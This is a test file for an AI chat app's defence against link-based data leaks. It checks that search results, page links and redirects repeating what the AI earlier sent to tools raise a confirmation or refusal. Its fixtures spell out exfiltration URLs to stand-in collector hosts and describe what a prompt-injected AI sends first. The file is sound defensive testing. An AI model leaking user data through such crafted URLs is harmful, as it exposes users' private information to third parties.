// The echo check for every learned web link (docs/DECISIONS.md "Web links: a bigger budget, the echo check for every
// learned link"; server/src/tools/connection-urls.ts webEcho, redirectGuard; migration 329). With the bigger budget
// (30 per answer, 150 per chat) a search result or a link of a fetched page that carries what the AI had sent to a
// tool of the chat before it came always asks, whatever is left of the budget; the others open within it. Also: a
// page's own links on its site do not count what the page's address carried (?page=2, ?id= of the next item), the AI
// sending a learned link on leaves no marks, the decision is taken as the link comes, and web_fetch checks each
// redirect like save_url. Local test servers stand in for sites; nothing resolves or opens a real name.
import { afterAll, beforeAll, describe, expect, setDefaultTimeout, test } from 'bun:test'
import { API } from '@mycel/shared/api'
import { uuidv7 } from '@mycel/shared'
import { startHarness, type Harness } from '../lib/b-harness'
import { noteEgressIp } from '../../server/src/tools/egress'
import { gateUrl, LINK_BUDGET, rememberUrls, type ConfirmExtra, type TurnPerson } from '../../server/src/tools/url-gate'
import { recordSent, redirectGuard, webEcho } from '../../server/src/tools/connection-urls'
import { webFetch, type FetchOptions } from '../../server/src/tools/web-fetch'
import { TEXT as GATE_TEXT } from '../../server/src/tools/url-gate'
import { checkReadable, MIGRATIONS_DIR, openDb, readMigrations } from '../../server/src/db'

setDefaultTimeout(60_000)

let h: Harness
beforeAll(async () => {
  h = await startHarness({ name: 'web-echo', askUserTimeoutMs: 4000, turnTimeoutMs: 60_000 })
  noteEgressIp(h.ctx, '198.51.100.9')
})
afterAll(async () => { await h?.close() })

type Asked = { question: string; extra?: ConfirmExtra; options?: { value: string }[] }
function person(answer: boolean, asked: Asked[] = [], unattended = false): TurnPerson {
  return {
    locale: 'en', unattended,
    async confirm(question, _a, _d, extra) { asked.push({ question, extra }); return answer },
    async choose(question, options, extra) { asked.push({ question, extra, options }); return answer ? 'allow' : null },
    turnUrls: () => [],
  }
}
async function chatWith(content = 'research this for me') {
  const chat = await h.api('alice').call(API.createChat, { body: {} })
  const u = uuidv7(), a = uuidv7()
  h.ctx.db.query("INSERT INTO messages (id, chat_id, role, author_id, content, status) VALUES (?, ?, 'user', 'alice', ?, 'done')").run(u, chat.id, content)
  h.ctx.db.query("INSERT INTO messages (id, chat_id, parent_id, role, content, status, steps) VALUES (?, ?, ?, 'assistant', 'ok', 'done', '[]')").run(a, chat.id, u)
  return chat.id as string
}
const echoOf = (chat: string, url: string) => (h.ctx.db.query('SELECT echo FROM chat_seen_urls WHERE chat_id = ? AND url = ?').get(chat, url) as { echo: number } | null)?.echo
const marks = (chat: string) => (h.ctx.db.query('SELECT COUNT(*) AS n FROM chat_sent_marks WHERE chat_id = ?').get(chat) as { n: number }).n
const free = (chat: string) => (h.ctx.db.query('SELECT COUNT(*) AS n FROM chat_seen_urls WHERE chat_id = ? AND free_turn_id IS NOT NULL').get(chat) as { n: number }).n
const SECRET = 'Zq7Hk2Pv9Wm4Xr6Tn3Ld' // 20 random-looking characters, as a key or a document id would be

describe('search results', () => {
  test('a result that repeats what the AI sent asks, whatever is left of the budget; the others open within it', async () => {
    const chat = await chatWith()
    // what an injected AI sends first: the data inside an address, and as a word of a search query
    recordSent(h.ctx.db, chat, { url: 'https://collector.example/c?d=Q3-revenue-12.4M-finance' })
    recordSent(h.ctx.db, chat, { query: `quarterly numbers ${SECRET}` })
    const benign = 'https://news.example/2026/markets-weekly'
    const echoes = [
      'https://collector.example/c?d=Q3-revenue-12.4M-finance', // the address itself
      'https://collector.example/c?d=Q3-revenue-12.4M-finance&utm_source=search', // its host and path, another query
      `https://${SECRET.toLowerCase()}.collector.example/`, // the random-looking part, moved into a name (lowercased)
      'https://search.example/out?to=' + encodeURIComponent('https://collector.example/c?d=Q3-revenue-12.4M-finance'), // inside another address
    ]
    rememberUrls(h.ctx.db, chat, [benign, ...echoes], 'search', webEcho(h.ctx.db, chat))
    expect(echoOf(chat, benign)).toBe(0)
    for (const u of echoes) expect(echoOf(chat, new URL(u).href)).toBe(1)
    const asked: Asked[] = []
    expect(await gateUrl(h.ctx.db, chat, benign, person(false, asked), { turnId: 't1', userId: 'alice' })).toBe('seen')
    for (const u of echoes) {
      await expect(gateUrl(h.ctx.db, chat, u, person(false, asked), { turnId: 't1', userId: 'alice' })).rejects.toThrow(/did not allow/)
    }
    expect(asked).toHaveLength(echoes.length)
    for (const a of asked) {
      expect(a.question).toContain('from a web page or a search result')
      expect(a.question).toContain('matches what the AI had sent to a tool earlier')
      // no "allow this site": this is the card an AI's try to send data out raises
      expect(a.options?.map((o) => o.value) ?? ['allow', 'deny']).toEqual(['allow', 'deny'])
    }
    // the budget was not spent on them: only the benign one counts
    expect(free(chat)).toBe(1)
    // a scheduled run (nobody to ask): refused, saying why
    await expect(gateUrl(h.ctx.db, chat, echoes[0]!, person(true, [], true), { turnId: 't2', userId: 'alice' })).rejects.toThrow(/the site may have repeated it/)
    // allowed on the card: remembered as allowed, opens later without one
    expect(await gateUrl(h.ctx.db, chat, echoes[0]!, person(true), { turnId: 't1', userId: 'alice' })).toBe('confirmed')
    expect(await gateUrl(h.ctx.db, chat, echoes[0]!, person(false), { turnId: 't1', userId: 'alice' })).toBe('seen')
  })

  test('an echo asks with the budget untouched and spends none of it', async () => {
    const chat = await chatWith()
    recordSent(h.ctx.db, chat, { note: `keep ${SECRET} safe` })
    const echo = `https://wiki.example/w/${SECRET}`
    rememberUrls(h.ctx.db, chat, [echo], 'search', webEcho(h.ctx.db, chat))
    const asked: Asked[] = []
    await expect(gateUrl(h.ctx.db, chat, echo, person(false, asked), { turnId: 'fresh', userId: 'alice' })).rejects.toThrow(/did not allow/)
    expect(free(chat)).toBe(0)
    expect(asked[0]!.question).toContain('matches what the AI had sent')
  })
})

describe('links of a fetched page', () => {
  test("the page's own links on its site do not count what the page's address carried; another site's do", async () => {
    // the person typed an item page; the AI's web_fetch input carried it (typed addresses leave marks: they can carry
    // the person's data)
    const page = 'https://forum.example.com/item?id=41234567'
    const chat = await chatWith(`summarise ${page} and the next ones`)
    recordSent(h.ctx.db, chat, { url: page })
    const same = ['https://forum.example.com/item?id=41234568', 'https://forum.example.com/item?id=41234567&p=2', 'https://m.forum.example.com/item?id=41234567']
    const other = ['https://share.example/intent?url=' + encodeURIComponent(page), `https://archive.example/web/2026/${page}`]
    rememberUrls(h.ctx.db, chat, [page, ...same, ...other], 'fetched', webEcho(h.ctx.db, chat, [page, page]))
    expect(echoOf(chat, page)).toBe(0)
    for (const u of same) expect(echoOf(chat, u)).toBe(0)
    for (const u of other) expect(echoOf(chat, new URL(u).href)).toBe(1)
    for (const u of same) expect(await gateUrl(h.ctx.db, chat, u, person(false), { turnId: 't', userId: 'alice' })).toBe('seen')
  })

  test('a document id in the page address: its own site may repeat it, another site may not', async () => {
    const page = `https://docs.example.com/d/1${SECRET}x/edit`
    const chat = await chatWith(`read ${page}`)
    recordSent(h.ctx.db, chat, { url: page })
    const view = `https://docs.example.com/d/1${SECRET}x/view`
    const cdn = `https://cdn.elsewhere.example/1${SECRET}x.pdf`
    rememberUrls(h.ctx.db, chat, [view, cdn], 'fetched', webEcho(h.ctx.db, chat, [page]))
    expect(echoOf(chat, view)).toBe(0)
    expect(echoOf(chat, cdn)).toBe(1)
  })

  test('what the AI sent elsewhere still counts on the page\'s own site', async () => {
    const page = 'https://search.example/results?q=weather'
    const chat = await chatWith()
    recordSent(h.ctx.db, chat, { body: `remember https://search.example/out?to=${SECRET}` })
    recordSent(h.ctx.db, chat, { url: page })
    const link = `https://search.example/out?to=${SECRET}`
    rememberUrls(h.ctx.db, chat, [link], 'fetched', webEcho(h.ctx.db, chat, [page]))
    expect(echoOf(chat, link)).toBe(1)
  })
})

describe('marks and the moment of the decision', () => {
  test('the AI sending a learned link on leaves no marks: a chain of searches, pages and their links asks nothing', async () => {
    const chat = await chatWith()
    const result = 'https://blog.example/posts/2026/web-research-guide'
    rememberUrls(h.ctx.db, chat, [result], 'search', webEcho(h.ctx.db, chat))
    const before = marks(chat)
    recordSent(h.ctx.db, chat, { url: result }) // web_fetch's input
    expect(marks(chat)).toBe(before)
    const links = [`${result}?page=2`, 'https://blog.example/posts/2026/web-research-guide/comments']
    rememberUrls(h.ctx.db, chat, links, 'fetched', webEcho(h.ctx.db, chat, [result]))
    recordSent(h.ctx.db, chat, { url: links[0] })
    expect(marks(chat)).toBe(before)
    for (const u of links) expect(echoOf(chat, u)).toBe(0)
  })

  test('an echo sent on still leaves marks; an address the person allowed too', async () => {
    const chat = await chatWith()
    recordSent(h.ctx.db, chat, { note: SECRET })
    const echo = `https://x.example/${SECRET}`
    rememberUrls(h.ctx.db, chat, [echo], 'search', webEcho(h.ctx.db, chat))
    const before = marks(chat)
    recordSent(h.ctx.db, chat, { url: echo, other: 'https://allowed.example/path/long-enough-to-mark' })
    expect(marks(chat)).toBeGreaterThan(before)
  })

  test('decided as the link comes: marks the AI leaves later do not turn it into an echo', async () => {
    const chat = await chatWith()
    const link = `https://papers.example/abs/${SECRET}`
    rememberUrls(h.ctx.db, chat, [link], 'fetched', webEcho(h.ctx.db, chat, ['https://papers.example/list']))
    recordSent(h.ctx.db, chat, { note: `cite ${SECRET}` })
    expect(await gateUrl(h.ctx.db, chat, link, person(false), { turnId: 't', userId: 'alice' })).toBe('seen')
    // the same address coming again after that is an echo from then on (it carries the marks now)
    rememberUrls(h.ctx.db, chat, [link], 'fetched', webEcho(h.ctx.db, chat))
    expect(echoOf(chat, link)).toBe(1)
  })

  test('an input too large to mark completely makes every new learned link an echo (fail closed)', async () => {
    const chat = await chatWith()
    recordSent(h.ctx.db, chat, { q: 'x'.repeat(4 * 1024 * 1024 + 10) })
    rememberUrls(h.ctx.db, chat, ['https://plain.example/a'], 'search', webEcho(h.ctx.db, chat))
    expect(echoOf(chat, 'https://plain.example/a')).toBe(1)
  })

  test('500 links of a page against 50,000 marks are checked quickly', async () => {
    const chat = await chatWith()
    const ins = h.ctx.db.query('INSERT OR IGNORE INTO chat_sent_marks (chat_id, mark) VALUES (?, ?)')
    h.ctx.db.transaction(() => { for (let i = 0; i < 49_000; i++) ins.run(chat, crypto.getRandomValues(new Uint8Array(16))) })()
    const links = Array.from({ length: 500 }, (_, i) => `https://many.example/p/${i}/a${crypto.randomUUID().replace(/-/g, '')}`)
    const t0 = performance.now()
    rememberUrls(h.ctx.db, chat, links, 'fetched', webEcho(h.ctx.db, chat, ['https://many.example/']))
    expect(performance.now() - t0).toBeLessThan(3000)
    expect((h.ctx.db.query('SELECT COUNT(*) AS n FROM chat_seen_urls WHERE chat_id = ? AND echo = 0').get(chat) as { n: number }).n).toBe(500)
  })
})

describe('web_fetch redirects (the same check as save_url)', () => {
  const seen: string[] = []
  let srv: ReturnType<typeof Bun.serve>
  const T: FetchOptions = { testAllow: (ip) => ip === '127.0.0.1', lookup: async () => [{ address: '127.0.0.1', family: 4 }], timeoutMs: 3000 }
  const at = (p: string) => `http://redir.test:${srv.port}${p}`
  beforeAll(() => {
    srv = Bun.serve({ port: 0, hostname: '127.0.0.1', fetch(req) {
      const u = new URL(req.url)
      seen.push(u.pathname + u.search)
      if (u.pathname === '/short') return Response.redirect(at(`/collect?d=${SECRET}`), 302)
      if (u.pathname === '/plain') return Response.redirect(at('/landing'), 302)
      if (u.pathname === '/self') return Response.redirect(at(`/self/?k=${SECRET}`), 301)
      // a search site's own redirector: /url?q=<address>
      if (u.pathname === '/url') return Response.redirect(u.searchParams.get('q') ?? at('/'), 302)
      return new Response('<html><body>ok</body></html>', { headers: { 'content-type': 'text/html' } })
    } })
  })
  afterAll(() => srv?.stop(true))

  test('a redirect to an address that echoes what the AI sent asks; declined, it is never requested', async () => {
    const chat = await chatWith()
    recordSent(h.ctx.db, chat, { body: `the key is ${SECRET}` })
    const asked: Asked[] = []
    const g = redirectGuard(h.ctx.db, chat, at('/short'), person(false, asked), { ask: GATE_TEXT.redirectEcho, unattended: 'nobody', declined: 'declined' })
    await expect(webFetch(at('/short'), { ...T, onRedirect: g.check })).rejects.toThrow('declined')
    expect(asked[0]!.question).toContain('The address the AI is opening redirects to another one')
    expect(asked[0]!.question).toContain(SECRET)
    expect(seen.some((s) => s.startsWith('/collect'))).toBe(false)
    // nobody to ask: not followed either
    const run = redirectGuard(h.ctx.db, chat, at('/short'), person(true, [], true), { ask: GATE_TEXT.redirectEcho, unattended: 'nobody', declined: 'declined' })
    await expect(webFetch(at('/short'), { ...T, onRedirect: run.check })).rejects.toThrow('nobody')
    expect(seen.some((s) => s.startsWith('/collect'))).toBe(false)
    // allowed: followed, and said so
    const yes = redirectGuard(h.ctx.db, chat, at('/short'), person(true), { ask: GATE_TEXT.redirectEcho, unattended: 'nobody', declined: 'declined' })
    expect((await webFetch(at('/short'), { ...T, onRedirect: yes.check })).text).toContain('ok')
    expect(yes.confirmed()).toBe(true)
    expect(seen.some((s) => s.startsWith('/collect'))).toBe(true)
  })

  test('an ordinary redirect, and one that keeps what the asked-for address carried, follow without a card', async () => {
    const chat = await chatWith()
    recordSent(h.ctx.db, chat, { url: at(`/self?k=${SECRET}`) })
    const asked: Asked[] = []
    for (const p of ['/plain', `/self?k=${SECRET}`]) {
      const g = redirectGuard(h.ctx.db, chat, at(p), person(false, asked), { ask: GATE_TEXT.redirectEcho, unattended: 'nobody', declined: 'declined' })
      expect((await webFetch(at(p), { ...T, onRedirect: g.check })).text).toContain('ok')
    }
    expect(asked).toHaveLength(0)
  })

  test('a page\'s own redirector link, excused on its site, cannot pass the AI\'s address on to another site', async () => {
    const other = (p: string) => `http://other.test:${srv.port}${p}`
    // the AI wrote the collector's address into a search on the redirecting site; the person allowed that page
    const page = at(`/search?q=${other(`/collect?d=${SECRET}`)}`)
    const chat = await chatWith()
    const collected = () => seen.filter((x) => x.startsWith('/collect')).length
    const before = collected()
    recordSent(h.ctx.db, chat, { url: page })
    // the page links to its own redirector with the same address: its own site, what the page carried: no echo
    const link = at(`/url?q=${other(`/collect?d=${SECRET}`)}`)
    rememberUrls(h.ctx.db, chat, [link], 'fetched', webEcho(h.ctx.db, chat, [page]))
    expect(echoOf(chat, link)).toBe(0)
    // opened, it redirects to the other site: checked in full there, so the person is asked
    const asked: Asked[] = []
    const g = redirectGuard(h.ctx.db, chat, link, person(false, asked), { ask: GATE_TEXT.redirectEcho, unattended: 'nobody', declined: 'declined' })
    await expect(webFetch(link, { ...T, onRedirect: g.check })).rejects.toThrow('declined')
    expect(asked).toHaveLength(1)
    expect(collected()).toBe(before)
    expect(seen.at(-1)).toStartWith('/url?q=')
    expect(asked[0]!.question).toContain(other('/collect'))
  })

  test('the time the person takes on the card does not count against the fetch time limit', async () => {
    const chat = await chatWith()
    recordSent(h.ctx.db, chat, { body: SECRET })
    const slow: TurnPerson = { ...person(true), async confirm() { await Bun.sleep(1500); return true } }
    const g = redirectGuard(h.ctx.db, chat, at('/short'), slow, { ask: GATE_TEXT.redirectEcho, unattended: 'nobody', declined: 'declined' })
    expect((await webFetch(at('/short'), { ...T, timeoutMs: 1000, onRedirect: g.check })).text).toContain('ok')
  })
})

test('migration 329: chat_seen_urls.echo, additive, no newer reader needed; an older build\'s rows get 0', () => {
  const m = readMigrations(MIGRATIONS_DIR).find((x) => x.version === 329)!
  expect(m.name).toBe('329_c_seen_url_echo.sql')
  expect(m.minCompatibleReader).toBe(1)
  expect(m.sql).not.toMatch(/DROP|RENAME|CREATE TABLE/i)
  const db = openDb(':memory:')
  try {
    const cols = (db.query('PRAGMA table_info(chat_seen_urls)').all() as { name: string; dflt_value: string | null; notnull: number }[])
    expect(cols.find((c) => c.name === 'echo')).toMatchObject({ dflt_value: '0', notnull: 1 })
    // 0.2.17 (reader level 4) opens it and writes its rows without the column
    expect(() => checkReadable(db, 4)).not.toThrow()
    db.exec('PRAGMA foreign_keys = OFF')
    db.query("INSERT OR IGNORE INTO chat_seen_urls (chat_id, url, source) VALUES ('c1', 'https://old.example/', 'fetched')").run()
    expect(db.query("SELECT echo FROM chat_seen_urls WHERE chat_id = 'c1'").get()).toEqual({ echo: 0 })
  } finally { db.close() }
})

test('the numbers in use', () => {
  expect(LINK_BUDGET).toEqual({ turn: 30, chat: 150, unattended: 8 })
})
